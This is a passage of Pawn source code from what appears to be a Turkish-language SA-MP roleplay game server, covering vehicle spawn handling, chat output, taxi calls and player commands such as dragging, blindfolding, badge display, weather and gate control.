			format(string2,sizeof(string2),"{E84D4D}[Paintball]{FFFFFF} toplam öldürme sayýnýz: %d",PlayerPBKills[killerid]);
			SendClientMessage(killerid,COLOR_WHITE,string2);
			if(PlayerPBKills[killerid] > PBLeaderKills)
			{
				PBLeaderKills = PlayerPBKills[killerid];
				PBLeaderid = killerid;
				format(string, sizeof(string), "{E84D4D}[Paintball]{FFFFFF} %s(ID: %d) adlý oyuncu toplam %d öldürmeyle 1. sýraya yükseldi.", pName, killerid, PlayerPBKills[killerid]);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(PlayerPBing[i])
					{
						SendClientMessage(i,COLOR_WHITE,string);
					}
				}
			}
		}
	}
	ResetPlayerWeapons(playerid);
	if(mavitaraf != playerid && kirmizitaraf != playerid && !join[playerid]) {
		foreach(new i : Guns)
		{
		    if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid])
		    {
		        if(OyuncuSilah[i][durum] != 1) continue;
		        if(OyuncuSilah[i][silahtip] != 1) continue;
		        OyuncuSilah[i][mermi] = 0;
		    }
	 	}
	 	new strs[40];
		format(strs,sizeof(strs), "(( Yaralandý. /hasarlar %d ))", playerid);
		SetPlayerChatBubble(playerid, strs, COLOR_DEATH, 10.0, 80000);
 	}
 	//KarakterKaydet(playerid);
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	if(Debug) printf("OnVehicleSpawn(%d)",vehicleid);
	ReCreateVehicle(vehicleid);
	if(Arac[vehicleid][arenk1] != -1 && Arac[vehicleid][arenk2] != -1)ChangeVehicleColor(vehicleid,Arac[vehicleid][arenk1],Arac[vehicleid][arenk2]);
	if(Arac[vehicleid][akilit] == 1)
	{
		KilitKapat(vehicleid);
	}
	else
	{
		KilitAc(vehicleid);
	}
	if(Arac[vehicleid][SirenD] == 1)
	{
		if(IsValidDynamicObject(Arac[vehicleid][SirenObje]))
		{
			DestroyDynamicObject(Arac[vehicleid][SirenObje]);
		}
		Arac[vehicleid][SirenD] = 0;
	}
	MotoruKapat(vehicleid);
	if(Arac[vehicleid][atip] != 2 && Arac[vehicleid][atip] != 3 && Arac[vehicleid][atip] != 4  && Arac[vehicleid][atip] != 5 && Arac[vehicleid][atip] != 6 && Arac[vehicleid][atip] != 7 && Arac[vehicleid][atip] != 8) UpdateVehicleDamageStatus(vehicleid, Arac[vehicleid][apanels], Arac[vehicleid][adoors], Arac[vehicleid][alights], Arac[vehicleid][atires]);
	SetVehicleHealth(vehicleid, Arac[vehicleid][ahasar]);
	if(Arac[vehicleid][ahasar] > 1000.0) CarFullHealth[vehicleid] = 1;
	SetVehiclePosEx(vehicleid, Arac[vehicleid][aposx], Arac[vehicleid][aposy], Arac[vehicleid][aposz]);
	SetVehicleZAngle(vehicleid, Arac[vehicleid][aposa]);
	LinkVehicleToInterior(vehicleid, Arac[vehicleid][ainterior]);
	SetVehicleVirtualWorld(vehicleid, Arac[vehicleid][avworld]);
	//Arac[vehicleid][aspawn] = 0;
	ModifiyeYukle(vehicleid);
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	if(Debug) printf("OnVehicleDeath(%d, %d)",vehicleid, killerid);
    if(Arac[vehicleid][aowner] != -1)
	{
		/*if(Arac[vehicleid][sigorta] == 1) Arac[vehicleid][sigorta]--;
		if(Arac[vehicleid][sigorta] < 0)
		{
		    foreach(new i : Player)
		    {
				if(Karakter[i][sqlid] == Arac[vehicleid][aowner])
				{
				    Ipucu(i, "Aracýnýzýn sigortasý olmadýðý için araç yok oldu.");
				}
		    }
			Arac[vehicleid][aowner] = -1;
			Arac[vehicleid][atip] = 1;
			Arac[vehicleid][abirliktip] = 0;
			new Float:pPos[3];
			foreach(new i : Player)
			{
				if(IsPlayerInVehicle(i, vehicleid))
			    {
					GetPlayerPos(i, pPos[0], pPos[1], pPos[2]);
					SetPlayerPos(i, pPos[0], pPos[1], pPos[2]+2);
				}
			}
			SetVehiclePos(vehicleid, 1682.4507,1622.2616,10.8203);
			SetVehicleVirtualWorld(vehicleid, 1);
			Arac[vehicleid][aposx] = 1682.4507;
			Arac[vehicleid][aposy] = 1622.2616;
			Arac[vehicleid][aposz] = 10.8203;
			Arac[vehicleid][avworld] = 1;
			AracAnahtarTumSil(vehicleid);
			AracKaydet(vehicleid);
		}
		else
		{
			Arac[vehicleid][ahasar] = 600.0;
			AMotorDurdur[vehicleid] = true;
			MotoruKapat(vehicleid);
			AracKaydet(vehicleid);
			foreach(new i : Player)
			{
				if(Karakter[i][sqlid] == Arac[vehicleid][aowner])
				{
				    Ipucu(i, "Aracýnýzýn hasarý sigorta tarafýndan karþýlandý, sigorta yaptýrmazsanýz aracýnýz yok olabilir.");
				}
	    	}
		}*/
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(Debug) printf("OnPlayerText(%d, %s)",playerid, text);
    if(gTvIzliyo[playerid]) return 0;
	if(Girdi[playerid] == false){ return 0; }
	if(Karakter[playerid][ajail] != 0) return 0;
	if(Girdi[playerid] == true)
	{

		new logstring[128];
		format(logstring, sizeof(logstring), "%s: %s", OyuncuAdiniBul(playerid), text);
	    Log(playerid, logstring);
	    printf("[YAZI] %s: %s", OyuncuAdiniBul(playerid), text);

		if (strcmp(":)", text, true, 10) == 0)
		{
			MeGonder(playerid, 30.0, "gülümser.");
			return 0;
	 	}
		if (strcmp(":D", text, true, 10) == 0)
		{
			MeGonder(playerid, 30.0, "kahkaha atar.");
			return 0;
		}
		if (strcmp(";)", text, true, 10) == 0)
		{
			MeGonder(playerid, 30.0, "göz kýrpar.");
			return 0;
		}
		new string[512];
		if(!Yayinda[playerid])
		{
			if(strlen(text) > 80)
			{ // 5
	 			new toxt[3][128];
				TextBol(text,toxt,60);
				if(Arama[playerid][2] != 0)
				{
				    TelefonYaziGonder(playerid, Arama[playerid][2], text);
					format(string, sizeof(string), "%s(telefon): %s ...",OyuncuAdiniBul(playerid), toxt[0]);
				}
				else format(string, sizeof(string), "%s: %s ...",OyuncuAdiniBul(playerid), toxt[0]);
				ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				format(string, sizeof(string), "%s: ... %s",OyuncuAdiniBul(playerid), toxt[1]);
				ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				KonusturMeyhaneci(playerid, strlen(text));
		   }
			else
			{
				if(Arama[playerid][2] != 0)
				{
				    TelefonYaziGonder(playerid, Arama[playerid][2], text);
					format(string, sizeof(string), "%s(telefon): %s",OyuncuAdiniBul(playerid), text);
				}
				else format(string, sizeof(string), "%s: %s",OyuncuAdiniBul(playerid), text);
				ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				new to_others[MAX_CHATBUBBLE_LENGTH+1];
				format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",text);
				KonusturMeyhaneci(playerid, strlen(text));
			}
		}
		else
		{
			if(strlen(text) > 80)
			{
	 			new ytoxt[3][256];
				TextBol(text,ytoxt,80);
				if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
				{
					format(string, sizeof(string), "[%s] %s: %s ...", Birlik[Karakter[playerid][birlik]][fisim], OyuncuAdiniBul(playerid), ytoxt[0]);
					YayinGonder(COLOR_ORANGE, string);
					format(string, sizeof(string), "... %s", ytoxt[1]);
					YayinGonder(COLOR_ORANGE, string);
				}
				else
				{
				    new __id = GetPVarInt(playerid, "CanliYayinID");
				    format(string, sizeof(string), "[%s] %s: %s ...", Birlik[__id][fisim], OyuncuAdiniBul(playerid), ytoxt[0]);
					YayinGonder(COLOR_ORANGE, string);
					format(string, sizeof(string), "... %s", ytoxt[1]);
					YayinGonder(COLOR_ORANGE, string);
				}
			    return 0;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
			{
				format(string, sizeof(string), "[%s] %s: %s", Birlik[Karakter[playerid][birlik]][fisim], OyuncuAdiniBul(playerid), text);
				YayinGonder(COLOR_ORANGE, string);
			}
			else
			{
			    new __id = GetPVarInt(playerid, "CanliYayinID");
			    format(string, sizeof(string), "[%s] %s: %s", Birlik[__id][fisim],OyuncuAdiniBul(playerid), text);
				YayinGonder(COLOR_ORANGE, string);
			}
		}
	}
	else
	{
	    return 0;
 	}
 	if(TaksiCagrisi[playerid])
 	{
 	    if(!strlen(text))
 	    {
 	        SendClientMessage(playerid, COLOR_YELLOW3, "LS TAKSÝ: {FFFFFF}Pardon, lütfen tekrarlar mýsýnýz?");
 	        return 0;
        }
        format(string, sizeof(string), "%s(telefon): %s", OyuncuAdiniBul(playerid), text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",text);
  		SetPlayerChatBubble(playerid,to_others,MESSAGE_COLOR,20.0,10000);
		RemovePlayerAttachedObject(playerid,INDEX_TELEFON);
 		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		TaksiCagrisi[playerid] = 0;
		for(new tx; tx < MAX_PLAYERS; tx++)
		{
		    if(Karakter[tx][meslek] == 2)
		    {
		        format(string, sizeof(string), "Bir müþteri taksi çaðýrýyor. Bulunduðu bölge: %s.", text);
		        Bilgi(tx, string);
			}
		}
		return 0;
	}
	return 0;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(Debug) printf("OnPlayerCommandReceived(%d, %s)",playerid, cmdtext);
    new oncommandtextlog[128];
    new string[256];
    new idx;
    string = strtok(cmdtext, idx);
	format(oncommandtextlog, sizeof(oncommandtextlog), "Komut girdi: ''%s''", cmdtext);
 	Log(playerid, oncommandtextlog);
 	printf("[KOMUT] %s: %s", OyuncuAdiniBul(playerid), string);
 	return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    if(Debug) printf("OnPlayerCommandPerformed(%d, %s, %s)",playerid, cmdtext, success);
	if(Girdi[playerid] == false){ return 1; }
	if(Karakter[playerid][ajail] != 0) return 1;
    new idx;
	new string[256];
	new specplayerid;
    string = strtok(cmdtext, idx);

    if(success)
	{
		return 1;
	}

 	new oncommandtextlog[128];
	format(oncommandtextlog, sizeof(oncommandtextlog), "Komut girdi: ''%s''", string);
 	Log(playerid, oncommandtextlog);
 	printf("[KOMUT] %s: %s", OyuncuAdiniBul(playerid), string);

	if(!strcmp(string, "/tezgahbilgi", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        for(new i; i < MAX_PLAYERS; i++)
	        {
     			if(PlayerToPoint(5.0, playerid, tPos[i][0], tPos[i][1], tPos[i][2]))
     			{
					format(string, sizeof(string), "Tezgah Sahibi: %s(%d)", OyuncuAdiniBul(i), i);
					Bilgi(playerid, string);
     			    return 1;
				}
			}
			Hata(playerid, "Burada tezgah yok.");
	    }
	    return 1;
	}
	if(!strcmp(string, "/asure", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(isnull(string))
	        {
	            format(string, sizeof(string), "asure: %d", Arac[GetPlayerVehicleID(playerid)][asure]);
	            Bilgi(playerid, string);
	        }
	        else {
	        	Arac[GetPlayerVehicleID(playerid)][asure] = strval(string);
			}
	        return 1;
	    }
 	}
	if(strcmp(string, "/saat", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(Karakter[playerid][ajail] > 0)
		    {
				format(string, sizeof(string), "Kalan dakika: %d", Karakter[playerid][ajail]);
				Bilgi(playerid, string);
			}
			else if(Karakter[playerid][kodes] > 0)
			{
			    format(string, sizeof(string), "Kalan dakika: %d", Karakter[playerid][kodes]);
			    Bilgi(playerid, string);
			}
			new mtext[20];
			new year, month,day;
			getdate(year, month, day);
			if(month == 1) { mtext = "Ocak"; }
			else if(month == 2) { mtext = "Subat"; }
			else if(month == 3) { mtext = "Mart"; }
			else if(month == 4) { mtext = "Nisan"; }
			else if(month == 5) { mtext = "Mayis"; }
			else if(month == 6) { mtext = "Haziran"; }
			else if(month == 7) { mtext = "Temmuz"; }
			else if(month == 8) { mtext = "Agustos"; }
			else if(month == 9) { mtext = "Eylul"; }
			else if(month == 10) { mtext = "Ekim"; }
			else if(month == 11) { mtext = "Kasim"; }
			else if(month == 12) { mtext = "Aralik"; }
			new hour,minuite,second;
			gettime(hour,minuite,second);
			format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d:%d~g~|", day, mtext, hour, minuite,second);
			GameTextForPlayer(playerid, string, 5000, 1);
			MeGonder(playerid, 15.0, "kol saatine bakar.");
			ApplyAnimationEx(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0);
		}
		return 1;
	}

	if(!strcmp(string, "/aractipleri", true))
	{
	    if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
	    {
			SendClientMessage(playerid, -1, "Araç Tipleri:");
			SendClientMessage(playerid, -1, "1 - Sahibi olan araçlar");
			SendClientMessage(playerid, -1, "2 - Faction Araçlarý");
			SendClientMessage(playerid, -1, "3 - Sevkiyat Mesleði");
			SendClientMessage(playerid, -1, "4 - Taksicilik Mesleði");
			SendClientMessage(playerid, -1, "5 - Kiralýk Araç");
			SendClientMessage(playerid, -1, "6 - Pizza");
			SendClientMessage(playerid, -1, "7 - Araç Sicil Temizleme Ýllegal Mesleði");
			SendClientMessage(playerid, -1, "8 - Ehliyet");
			SendClientMessage(playerid, -1, "9 - Temizlik Mesleði");
			SendClientMessage(playerid, -1, "10 - Sevkiyat Aracý");
			SendClientMessage(playerid, -1, "11 - Hafriyat Mesleði");
			SendClientMessage(playerid, -1, "12 - Elektronik Mesleði");
			SendClientMessage(playerid, -1, "13 - Lojistik Mesleði");
		}
		return 1;
	}
	if(!strcmp(string, "/isyeritipleri", true))
	{
	    if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
	    {
			SendClientMessage(playerid, -1, "Ýþyeri Tipleri:");
			SendClientMessage(playerid, -1, "1 - Market");
			SendClientMessage(playerid, -1, "2 - Pizza Restorant");
			SendClientMessage(playerid, -1, "3 - Burger Restorant");
			SendClientMessage(playerid, -1, "4 - Tavuk Restorant");
			SendClientMessage(playerid, -1, "5 - Bar");
			SendClientMessage(playerid, -1, "6 - Kýyafet Dükkaný");
			SendClientMessage(playerid, -1, "7 - Silah Dükkaný");
			SendClientMessage(playerid, -1, "8 - Depo");
			SendClientMessage(playerid, -1, "9 - Diðer");
			SendClientMessage(playerid, -1, "10 - Pay 'n SprayF");
			SendClientMessage(playerid, -1, "11 - Banka");
			SendClientMessage(playerid, -1, "12 - Mobilya Dükkaný");
			SendClientMessage(playerid, -1, "13 - (bunu atla)");
			SendClientMessage(playerid, -1, "14 - GYM");
			SendClientMessage(playerid, -1, "15 - GARAJ");
			SendClientMessage(playerid, -1, "16 - SEVKIYAT");
			SendClientMessage(playerid, -1, "17 - PawnShop");
			SendClientMessage(playerid, -1, "18 - Yeni Kýyafet Dükkaný");
			SendClientMessage(playerid, -1, "19 - Spor Aletleri Dükkaný");
			SendClientMessage(playerid, -1, "20 - Normal Galeri");
			SendClientMessage(playerid, -1, "21 - Super Sport Galeri");
		}
		return 1;
	}
	if(!strcmp(string, "/cc", true))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			for(new i; i < MAX_PLAYERS; i++)
			{
			    if(IsPlayerConnected(playerid))
				{
					for(new a; a < 35; a++) SendClientMessage(i, -1, "");
				}
			}
		}
		return 1;
	}

	if(!strcmp(string, "/sigara", true))
	{
	    if(Karakter[playerid][sigara] > 0)
	    {
			Karakter[playerid][sigara]--;
			ApplyAnimationEx(playerid,"SMOKING","M_smk_in",4.1, 1, 1, 1, 1, 1);
			SetPlayerSpecialAction(playerid, 21);
			Ipucu(playerid, "Sigara içmek için sol fare tuþunu kullanýnýz. Sonlandýrmak için ise F tuþuna basýnýz.");
	    }
	    else
	    {
	        Hata(playerid, "Sigaranýz yok, marketten satýn alabilirsiniz.");
	        return 1;
		}
	    return 1;
	}


	if(!strcmp(string, "/iortak", true))
	{
	    string = strtok(cmdtext, idx);
		new mesafe = IsyeriMesafesi(2.0, playerid);
	    new giveplayerid = ReturnUser(string);
	    if(isnull(string)){Kullanim(playerid, "/iortak [oyuncuID]");Ipucu(playerid, "Eðer iþyerinizin ortaklýðýný feshetmek istiyorsanýz -1 deðerini girmeniz yeterlidir."); return 1; }
        if(strval(string) == -1){ Isyeri[mesafe][ortak] = -1; Bilgi(playerid, "Ýþyerinizin ortaklýðýný baþarýyla feshettiniz."); return 1; }
		if(giveplayerid == INVALID_PLAYER_ID) return Hata(playerid, "Böyle bir oyuncu bulunamadý.");
		if(giveplayerid == playerid) return Hata(playerid, "Ýþyerinize kendinizi ortak edemezsiniz.");
		if(mesafe == 0) return Hata(playerid, "Ýþyerinizin yakýnýnda olmalýsýnýz.");
		if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid]) return Hata(playerid, "Size ait olmayan bir iþyerine herhangi bir oyuncuyu ortak edemezsiniz.");
		if(Isyeri[mesafe][ortak] != -1) return Hata(playerid, "Yeni bir ortak alabilmek için mevcut ortaðýnýzý ortaklýktan atmalýsýnýz.");
		if(ProxDetectorS(5.0, playerid, giveplayerid))
		{
			format(string, sizeof(string), "BAÞARILI! %s adlý iþyerinin yeni ortaðý artýk %s oldu!", Isyeri[mesafe][iad], OyuncuAdiniBul(giveplayerid));
			Bilgi(playerid, string);
			Bilgi(giveplayerid, string);
			Isyeri[mesafe][ortak] = Karakter[giveplayerid][sqlid];
		}
		else
		{
		    Hata(playerid, "Oyuncu yakýnýnýzda olmalýdýr, aksi taktirde iþlem gerçekleþtirilemez.");
		    return 1;
		}
		return 1;
	}
	if(!strcmp(string, "/surukle", true))
	{
	    string = strtok(cmdtext, idx);
	    if(isnull(string)) return Kullanim(playerid, "/surukle [oyuncuID]");
	    new giveplayerid = ReturnUser(string);
		if(giveplayerid == INVALID_PLAYER_ID) return Hata(playerid, "Böyle bir oyuncu bulunamadý.");
		if(giveplayerid == playerid) return Hata(playerid, "Kendinizi sürükleyemezsiniz.");
		if(Karakter[giveplayerid][ajail] > 2 || Karakter[giveplayerid][kodes] > 2)
		{
		    Hata(playerid, "Bu oyuncu yönetici cezasýnda veya IC hapiste. Sürükleme iþlemi gerçekleþtirilemez.");
		    return 1;
		}
		if(!ProxDetectorS(5.0, playerid, giveplayerid))
		{
		    Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
		    return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
		    if(Karakter[giveplayerid][surukleyen] == playerid)
		    {
		        Karakter[giveplayerid][suruklenen] = -1;
		        Karakter[giveplayerid][surukleyen] = -1;
		        Karakter[playerid][suruklenen] = -1;
		        Karakter[playerid][surukleyen] = -1;
		        Bilgi(playerid, "Sürüklemeyi býraktýnýz.");
		        format(string, sizeof(string), "%s'yi sürüklemeyi býrakýr.", OyuncuAdiniBul(giveplayerid));
				MeGonder(playerid, 30.0, string);
				Bilgi(giveplayerid, "Sürüklemeniz sonlandýrýldý.");
				COZ(giveplayerid);
				return 1;
		    }
		    if(!IsPlayerInAnyVehicle(giveplayerid))
		    {
		        Karakter[playerid][surukleyen] = giveplayerid;
		        Karakter[giveplayerid][surukleyen] = playerid;
		        format(string, sizeof(string), "%s adlý oyuncuyu sürüklemek için teklif gönderdiniz.", OyuncuAdiniBul(giveplayerid));
		        Bilgi(playerid, string);
		        format(string, sizeof(string), "%s'yi sürüklemeye çalýþýr.", OyuncuAdiniBul(giveplayerid));
		        MeGonder(playerid, 30.0, string);
		        format(string, sizeof(string), "%s adlý oyuncu sizi sürüklemeye çalýþýyor.\nNe cevap vermek istersiniz?", OyuncuAdiniBul(playerid));
		        ShowPlayerDialog(giveplayerid, 3006, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Sürükleme Sistemi", string, "Onayla", "Reddet");
		    }
		    else
		    {
		        Hata(playerid, "Bu oyuncu araçta olduðu için sürükleyemezsiniz.");
		        return 1;
		    }
		}
		else
		{
		    Hata(playerid, "Bu oyuncu henüz oyuna giriþ yapmamýþ/oyunda deðil.");
		    return 1;
		}
		return 1;
	}
	if(!strcmp(string, "/gozbagla", true))
	{
		string = strtok(cmdtext, idx);
		if(isnull(string)) return Kullanim(playerid, "/gozbagla [oyuncuID]");
		new giveplayerid = ReturnUser(string);
		if(giveplayerid == playerid) return Hata(playerid, "Kendinizin gözünü baðlayamazsýnýz.");
		if(Karakter[playerid][GozBaglamaBezi] == 1)
		{
			if(!ProxDetectorS(5.0, playerid, giveplayerid))
			{
			    Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
			    return 1;
			}
		    if(IsPlayerConnected(giveplayerid))
		    {
		        if(giveplayerid == INVALID_PLAYER_ID) return Hata(playerid, "Böyle bir oyuncu bulunamadý.");
		        if(GozBaglandi[playerid] == 1) return Hata(playerid, "Bir baþkasýnýn gözünü baðlayamazsýnýz.");
		        if(GozBaglandi[giveplayerid] == 1)
		        {
		            GozBaglandi[giveplayerid] = 0;
		            GozBaglayan[giveplayerid] = -1;
		            SetCameraBehindPlayer(giveplayerid);
					format(string, sizeof(string), "%s isimli oyuncunun göz baðýný çözdünüz.", OyuncuAdiniBul(giveplayerid));
					Bilgi(playerid, string);
					format(string, sizeof(string), "%s isimli oyuncu göz baðýnýzý çözdü.", OyuncuAdiniBul(playerid));
					Bilgi(giveplayerid, string);
					format(string, sizeof(string), "%s'nin gözbaðýný çözer.", OyuncuAdiniBul(giveplayerid));
					MeGonder(playerid, 30.0, string);
					return 1;
		        }
		        else
		        {
		        	format(string, sizeof(string), "elindeki bezi %s'nin gözlerine geçirmeye çalýþýr.",OyuncuAdiniBul(giveplayerid));
		        	MeGonder(playerid, 30.0, string);
					format(string, sizeof(string), "%s isimli oyuncu gözlerinizi baðlamak istiyor.\nNe cevap vermek istersiniz?", OyuncuAdiniBul(playerid));
					ShowPlayerDialog(giveplayerid, 3005, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Göz Baðý", string, "Onayla", "Reddet");
					GozBaglayan[giveplayerid] = playerid;
					format(string, sizeof(string), "%s isimli oyuncuya göz baðlama teklifi gönderdiniz.", OyuncuAdiniBul(giveplayerid));
					Bilgi(playerid, string);
				}
		    }
		}
		else
		{
		    Hata(playerid, "Göz baðlama beziniz yok. Marketten satýn alabilirsiniz.");
		}
		return 1;
	}
	if(!strcmp(string, "/rozetgoster", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
	    {
	        string = strtok(cmdtext, idx);
	        if(isnull(string)) return Kullanim(playerid, "/rozetgoster [oyuncuID]");
	        new giveplayerid = ReturnUser(string);
			if (ProxDetectorS(5.0, playerid, giveplayerid ) )
			{
		        format(string, sizeof(string), ""C1"LOS SANTOS POLÝS DEPARTMANI\n\n%s\t%s\n\nRozet Sicil Numarasý:\t%d", RutbesiniVer(playerid), OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
		        ShowPlayerDialog(giveplayerid, 175, DIALOG_STYLE_MSGBOX, "SAN ANDREAS EYALETÝ", string, "Kapat", "");
		        format(string, sizeof(string), "/me rozetini %s doðru gösterir.", OyuncuAdiniBul(giveplayerid) );
		        OnPlayerCommandPerformed(playerid, string,0);
			}
			else Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
	    }
	    else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
	        string = strtok(cmdtext, idx);
	        if(isnull(string)) return Kullanim(playerid, "/rozetgoster [oyuncuID]");
	        new giveplayerid = ReturnUser(string);
			if (ProxDetectorS(5.0, playerid, giveplayerid ) )
			{
		        format(string, sizeof(string), ""C1"FBI\n\n%s\t%s\n\nRozet Sicil Numarasý:\t%d", RutbesiniVer(playerid), OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
		        ShowPlayerDialog(giveplayerid, 175, DIALOG_STYLE_MSGBOX, "SAN ANDREAS EYALETÝ", string, "Kapat", "");
		        format(string, sizeof(string), "/me rozetini %s doðru gösterir.", OyuncuAdiniBul(giveplayerid));
		        OnPlayerCommandPerformed(playerid, string,0);
			}
			else Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
	    }
	    return 1;
	}

	if(strcmp(string, "/hava", true) == 0 || strcmp(string, "/weather", true) == 0)
	{
  		if(IsPlayerConnected(playerid))
		{
			if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
			{
			   string = strtok(cmdtext,idx);
			   if(!strlen(string))
			   {
			       Kullanim(playerid, "/hava [hava ID]");
			       return 1;
			   }
			   new weather;
			   weather = strval(string);
			   if(weather < 0||weather > 255) { Hata(playerid, "Hava ID'si, 0 ile 255 arasýnda olmalýdýr!"); return 1; }
			   SetWeather(weather);
			   ServerWeather = weather;
			   SendClientMessage(playerid, COLOR_GREY, "Hava ayarlandý!");
			}
			else
			{
			    Hata(playerid, " Bu komutu kullanmak için yetkiniz yok.");
				return 1;
			}
	  	}
		return 1;
	}

	if(strcmp(string, "/time", true) == 0)
	{
		if(IsPlayerConnected(playerid))
	    {
      		if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
			{
			   string = strtok(cmdtext,idx);
			   if(!strlen(string))
			   {
			       Kullanim(playerid, "/time [saat]");
			       return 1;
			   }
			   new weather;
			   weather = strval(string);
			   if(weather < 0||weather > 24) { Hata(playerid, "Saat, -1 ile 25 arasýnda olmalýdýr!"); return 1; }
			   SetWorldTime(weather);
			   SendClientMessage(playerid, COLOR_GREY, "Saat ayarlandý!");
			}
			else
			{
				Hata(playerid, " Bu komutu kullanmak için yetkiniz yok.");
				return 1;
			}
		}
	  	return 1;
	}

	if(!strcmp("/kapi", string, true))
	{
	    for(new id;id<MAX_GATE;id++)
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				if(IsPlayerInRangeOfPoint(playerid, 3, Gate[id][gx],Gate[id][gy],Gate[id][gz]))
				{
				    if(Gate[id][gsahip] == Karakter[playerid][sqlid] || Gate[id][gbirlik] == Karakter[playerid][birlik] || Karakter[playerid][adminlevel] >= 1)
				    {
					    switch(Gate[id][gdurum])
					    {
							case 0:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gox], Gate[id][goy], Gate[id][goz], 1.6, Gate[id][gorx], Gate[id][gory], Gate[id][gorz]);
							    Gate[id][gdurum] = 1;
							}
							case 1:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gx], Gate[id][gy], Gate[id][gz], 1.6, Gate[id][grx], Gate[id][gry], Gate[id][grz]);
							    Gate[id][gdurum] = 0;
							}
					    }
					}
				}
			}
			else
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15, Gate[id][gx],Gate[id][gy],Gate[id][gz]))
				{
				    if(Gate[id][gsahip] == Karakter[playerid][sqlid] || Gate[id][gbirlik] == Karakter[playerid][birlik] || Karakter[playerid][adminlevel] >= 1)
				    {
					    switch(Gate[id][gdurum])
					    {
							case 0:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gox], Gate[id][goy], Gate[id][goz], 1.6, Gate[id][gorx], Gate[id][gory], Gate[id][gorz]);
							    Gate[id][gdurum] = 1;
							}
							case 1:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gx], Gate[id][gy], Gate[id][gz], 1.6, Gate[id][grx], Gate[id][gry], Gate[id][grz]);
							    Gate[id][gdurum] = 0;
							}
					    }
					}
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
		{
			if(IsPlayerInRangeOfPoint(playerid, 15.0, 774,-1330.19995,12.7)) switch(SanTVGates[0][1])
			{
				case 0:
				{
					MoveDynamicObject(SanTVGates[0][0] ,765.2000, -1330.2000, 12.7000, 1.0);
					SanTVGates[0][1] = 1;
					PlayerPlaySoundEx(1035, 774,-1330.19995,12.7);
				}
				case 1:
				{
					MoveDynamicObject(SanTVGates[0][0],774.0000000,-1330.1999500,12.7000000, 1.0);
					SanTVGates[0][1] = 0;
					PlayerPlaySoundEx(1035, 774,-1330.19995,12.7);
				}
			}
			else if(IsPlayerInRangeOfPoint(playerid, 15.0, 782.29999,-1384.90002,12.9)) switch (SanTVGates[1][1])
			{
				case 0:
				{
					MoveDynamicObject(SanTVGates[1][0] ,773.8000, -1384.9000, 12.9000, 1.0);
					SanTVGates[1][1] = 1;
					PlayerPlaySoundEx(1035, 782.29999,-1384.90002,12.9);
				}
				case 1:
				{
					MoveDynamicObject(SanTVGates[1][0],782.2999900,-1384.9000200,12.9000000, 1.0);
					SanTVGates[1][1] = 0;
					PlayerPlaySoundEx(1035, 782.29999,-1384.90002,12.9);
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Karakter[playerid][adminlevel] >= 1)
		{
			if(IsPlayerInRangeOfPoint(playerid, 15.0, 1544.2952,-1627.2408,13.3828))
			{
				MoveDynamicObject(LSPDObjs[0][0],1544.68,-1630.91,13.0231, 3.5, 0,-0.099967,-89.8357); //commander north
				LSPDObjs[0][2] = 1;
				PlayerPlaySoundEx(1083, 232.899703, 109.074996, 1009.211791);
				SetTimerEx("ShutUp",4000,false,"d",0);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 275.750000, 117.399414, 1003.617187))
			{
